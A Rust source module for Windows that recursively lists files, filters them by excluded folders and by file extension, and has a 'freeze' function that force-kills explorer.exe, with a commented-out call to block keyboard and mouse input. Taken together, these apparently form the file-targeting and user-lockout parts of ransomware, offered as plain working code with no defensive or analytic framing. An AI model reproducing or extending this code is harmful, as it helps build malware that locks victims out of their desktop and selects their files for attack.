use anyhow::{Result, Context};
use std::ffi::CStr;
use std::mem::size_of;
use std::process::Command;
use std::path::{Path, PathBuf};
use std::os::windows::process::CommandExt;
use winapi::um::winuser::BlockInput;
use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, TH32CS_SNAPPROCESS, PROCESSENTRY32};
use winapi::um::handleapi::CloseHandle;

// Simply executing the command: cmd.exe /c "dir /s /b <TARGET_DIR>
pub fn gen_list(dir: &str) -> Result<Vec<PathBuf>> {
    let output = Command::new("cmd")
        .args(["/c", "dir", "/s", "/b", dir])
        .output()?;

    let result: Vec<PathBuf> = String::from_utf8(output.stdout)?
        .lines()
        .map(PathBuf::from)
        .collect();

    Ok(result)

}

// Filtering files by exclusions
pub fn exclusion_filter(list: &[PathBuf], XCLUSIONS: &[&str]) -> Result<Vec<PathBuf>> {

    let mut generated_list: Vec<PathBuf> = Vec::new();
    for path in list {
        let parent = path.parent().unwrap().to_path_buf();        
        let parent_str = parent.to_string_lossy().to_lowercase();

        // Check if parent contains any excluded folder
        let should_exclude = XCLUSIONS.iter().any(|&excl| {
            parent_str.contains(&excl.to_lowercase())
        });
         
        if !should_exclude { generated_list.push(path.to_path_buf());}
    }

    Ok(generated_list)

}

// Filtering files by extension.
pub fn extention_filter(list: &[PathBuf], XTENSIONS: &[&str]) -> Result<Vec<PathBuf>> {
    let result = list
        .iter()
        .filter(|path| {
            if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                let ext_lower = ext.to_lowercase();
                XTENSIONS.iter().any(|&x| x == ext_lower)
            } else {
                false
            }
        })
        .cloned()
        .collect();

    Ok(result)
}

pub fn freeze() {
    unsafe {
        // Take a snapshot of all processes
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);


        // Iterate through processes
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed();
        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry) == 1 {
            loop {
                // Check if the process is explorer.exe
                let process_name = CStr::from_ptr(process_entry.szExeFile.as_ptr())
                    .to_string_lossy()
                    .to_string();
                if process_name == "explorer.exe" {
                    // Open the process
                    let process_handle = OpenProcess(0x1F0FFF, 0, process_entry.th32ProcessID);
                    if !process_handle.is_null() {
                        // Terminate the process
                        TerminateProcess(process_handle, 0);
                        CloseHandle(process_handle);
                        //BlockInput(1);
                    }
                }

                // Move to the next process
                if Process32Next(snapshot, &mut process_entry) == 0 {
                    break;
                }
            }
        }

        // Close the snapshot handle
        CloseHandle(snapshot);
    }
}
